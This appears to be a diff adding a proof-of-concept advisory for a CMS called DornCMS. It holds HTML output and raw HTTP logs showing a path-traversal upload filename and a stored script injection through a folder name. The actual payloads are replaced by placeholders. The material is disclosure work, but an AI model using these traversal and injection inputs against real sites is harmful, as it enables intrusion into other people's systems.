@@ -1,0 +1,207 @@
+PoC: Upload > Browse File - files/ Name
+
+<div id="fileinfo_holder">
+      Current Directory: <span id="current_path">files/</span>
+      <div id="fileinfo"><table class="standard">
+  <tbody><tr>
+    <th class="ui-state-active"> 
+    </th><th class="ui-state-active">Name</th>
+    <th class="ui-state-active">Preview</th>
+    <th class="ui-state-active">Size</th>
+    <th class="ui-state-active"> </th>
+  </tr>
+  <tr><td><input value="files/<iframe src=a>" type="checkbox"></td>
+<td><a href="/dorncms/files/<../../[LOCAL FILE/PATH INCLUDE VULNERABILITY!]>" target="_blank"><iframe src="a"></a></td>
+<td style='width: 300px;'><em>no preview</em></td><td>51 kb</td>
+<td><a href='/dorncms/cms/delete_file/?name=files%2F%3C<../../[LOCAL FILE/PATH INCLUDE VULNERABILITY!]' 
+class='ajax_link delete'>delete</a> | <a href='/dorncms/cms/rename_file/?name=files%2F%3C<../../[LOCAL FILE/PATH INCLUDE VULNERABILITY!]"<' 
+class='ajax_link rename'>rename</a></td></tr></table></iframe></a></td></tr></tbody></table></div></div>
+
+
+
+--- PoC Session Request Logs ---
+Status: 200[OK]
+POST http://www.example.com/dorncms/cms/doajaxfileupload/?directory=files/ 
+Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] 
+Content Size[46] Mime Type[text/html]
+
+Request Headers:
+Host[www.example.com]
+User-Agent[Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0]
+Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+Accept-Language[en-US,en;q=0.5]
+Accept-Encoding[gzip, deflate]
+DNT[1]
+Referer[http://www.example.com/dorncms/cms/upload/file/]
+Cookie[__utma=87180614.576957282.1381681699.1381688518.1381691247.5; __utmc=87180614; 
+__utmz=87180614.1381681699.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); 
+uvts=iexqgvWCEnvk3fI; __gads=ID=510fdc08255814de:T=1381681756:S=ALNI_MZliqnNeNYBzuLMn-8D_tU8PM_Ugg; 
+__utmb=87180614.6.10.1381691247; PHPSESSID=036s0d3jidrcp2mrapst0uqdb5]
+Connection[keep-alive]
+
+Post Data:
+POST_DATA[-----------------------------7708139255231
+Content-Disposition: form-data; name="fileToUpload"; filename="<<../../[LOCAL FILE/PATH INCLUDE VULNERABILITY!]>"
+Content-Type: image/png
+.PNG
+
+
+Status: 200[OK]
+POST http://www.example.com/dorncms/cms/filelist/ 
+Load Flags[LOAD_BYPASS_CACHE  LOAD_BACKGROUND  ] 
+Content Size[318] 
+Mime Type[text/html]
+
+Request Headers:  
+Host[www.example.com]
+User-Agent[Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0]
+Accept[*/*]
+Accept-Language[en-US,en;q=0.5]
+Accept-Encoding[gzip, deflate]
+DNT[1]
+Content-Type[application/x-www-form-urlencoded; charset=UTF-8]
+X-Requested-With[XMLHttpRequest]
+Referer[http://www.example.com/dorncms/cms/upload/file/]
+Content-Length[13]
+Cookie[__utma=87180614.576957282.1381681699.1381688518.1381691247.5; __utmc=87180614; 
+__utmz=87180614.1381681699.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); 
+uvts=iexqgvWCEnvk3fI; __gads=ID=510fdc08255814de:T=1381681756:S=ALNI_MZliqnNeNYBzuLMn-8D_tU8PM_Ugg; 
+__utmb=87180614.6.10.1381691247; PHPSESSID=036s0d3jidrcp2mrapst0uqdb5]
+Connection[keep-alive]
+Pragma[no-cache]
+Cache-Control[no-cache]
+
+Post Data:
+path[files%2F]
+Response Headers:
+Date[Sun, 13 Oct 2013 19:25:57 GMT]
+Server[Apache]
+Expires[Thu, 19 Nov 1981 08:52:00 GMT]
+Cache-Control[no-store, no-cache, must-revalidate, post-check=0, pre-check=0]
+Pragma[no-cache]
+Vary[Accept-Encoding]
+Content-Encoding[gzip]
+Content-Length[318]
+Keep-Alive[timeout=2, max=99]
+Connection[Keep-Alive]
+Content-Type[text/html]
+Status: 200[OK]
+
+GET http://www.example.com/dorncms/cms/upload/file/<../../[LOCAL FILE/PATH INCLUDE VULNERABILITY!]
+Load Flags[LOAD_DOCUMENT_URI  ] 
+Content Size[20] 
+Mime Type[text/html]
+
+Request Headers:
+Host[www.example.com]
+User-Agent[Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0]
+Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+Accept-Language[en-US,en;q=0.5]
+Accept-Encoding[gzip, deflate]
+DNT[1]
+Referer[http://www.example.com/dorncms/cms/upload/file/]
+Cookie[__utma=87180614.576957282.1381681699.1381688518.1381691247.5; __utmc=87180614; 
+__utmz=87180614.1381681699.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); 
+uvts=iexqgvWCEnvk3fI; __gads=ID=510fdc08255814de:T=1381681756:S=ALNI_MZliqnNeNYBzuLMn-8D_tU8PM_Ugg; 
+__utmb=87180614.6.10.1381691247; PHPSESSID=036s0d3jidrcp2mrapst0uqdb5]
+Connection[keep-alive]
+
+Response Headers:
+Date[Sun, 13 Oct 2013 19:25:58 GMT]
+Server[Apache]
+Expires[Thu, 19 Nov 1981 08:52:00 GMT]
+Cache-Control[no-store, no-cache, must-revalidate, post-check=0, pre-check=0]
+Pragma[no-cache]
+Vary[Accept-Encoding]
+Content-Encoding[gzip]
+Content-Length[20]
+Keep-Alive[timeout=2, max=98]
+Connection[Keep-Alive]
+Content-Type[text/html]
+
+
+PoC: Add Sub Directory (File Manager)
+
+<ul class="jqueryFileTree">
+  <li class="directory"><a href="#" rel="uploadedimages/" id="uploadedimages">images</a>
+    </li>
+  <li class="directory"><a class="selected" href="#" rel="files/" id="files">files</a>
+  <ul class="jqueryFileTree"><li class="directory"><a href="#" 
+rel="files></a>>"<[PERSISTENT SCRIPT CODE VULNERABILITY!]"<;)<">>" 
+<<../../x"<;)<">>)<</a></li></ul></li>
+</ul></iframe></a></li></ul></li></ul>
+
+
+
+--- PoC Session Request Logs ---
+Status: 200[OK]
+GET http://www.example.com/dorncms/cms/folderlist/ 
+Load Flags[LOAD_BACKGROUND  ] 
+Content Size[186] 
+Mime Type[text/html]
+   
+Request Headers:
+Host[www.example.com]
+User-Agent[Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0]
+Accept[*/*]
+Accept-Language[en-US,en;q=0.5]
+Accept-Encoding[gzip, deflate]
+DNT[1]
+X-Requested-With[XMLHttpRequest]
+Referer[http://www.example.com/dorncms/cms/upload/file/]
+Cookie[__utma=87180614.576957282.1381681699.1381688518.1381691247.5; __utmc=87180614; 
+__utmz=87180614.1381681699.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); 
+uvts=iexqgvWCEnvk3fI; __gads=ID=510fdc08255814de:T=1381681756:S=ALNI_MZliqnNeNYBzuLMn-8D_tU8PM_Ugg; 
+__utmb=87180614.5.10.1381691247; PHPSESSID=036s0d3jidrcp2mrapst0uqdb5]
+Connection[keep-alive]
+   
+
+Response Headers:
+Date[Sun, 13 Oct 2013 19:19:41 GMT]
+Server[Apache]
+Expires[Thu, 19 Nov 1981 08:52:00 GMT]
+Cache-Control[no-store, no-cache, must-revalidate, post-check=0, pre-check=0]
+Pragma[no-cache]
+Vary[Accept-Encoding]
+Content-Encoding[gzip]
+Content-Length[186]
+Keep-Alive[timeout=2, max=98]
+Connection[Keep-Alive]
+Content-Type[text/html]
+
+
+Status: 200[OK]
+GET http://www.example.com/dorncms/cms/upload/file/[PERSISTENT SCRIPT CODE VULNERABILITY!]"<
+Load Flags[LOAD_DOCUMENT_URI  ] 
+Content Size[20] 
+Mime Type[text/html]
+
+Request Headers:
+Host[www.example.com]
+User-Agent[Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0]
+Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+Accept-Language[en-US,en;q=0.5]
+Accept-Encoding[gzip, deflate]
+DNT[1]
+Referer[http://www.example.com/dorncms/cms/upload/file/]
+Cookie[__utma=87180614.576957282.1381681699.1381688518.1381691247.5; __utmc=87180614; 
+__utmz=87180614.1381681699.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); 
+uvts=iexqgvWCEnvk3fI; __gads=ID=510fdc08255814de:T=1381681756:S=ALNI_MZliqnNeNYBzuLMn-8D_tU8PM_Ugg; 
+__utmb=87180614.5.10.1381691247; PHPSESSID=036s0d3jidrcp2mrapst0uqdb5]
+Connection[keep-alive]
+
+ 
+Response Headers:
+Date[Sun, 13 Oct 2013 19:19:41 GMT]
+Server[Apache]
+Expires[Thu, 19 Nov 1981 08:52:00 GMT]
+Cache-Control[no-store, no-cache, must-revalidate, post-check=0, pre-check=0]
+Pragma[no-cache]
+Vary[Accept-Encoding]
+Content-Encoding[gzip]
+Content-Length[20]
+Keep-Alive[timeout=2, max=97]
+Connection[Keep-Alive]
+Content-Type[text/html]
+
+
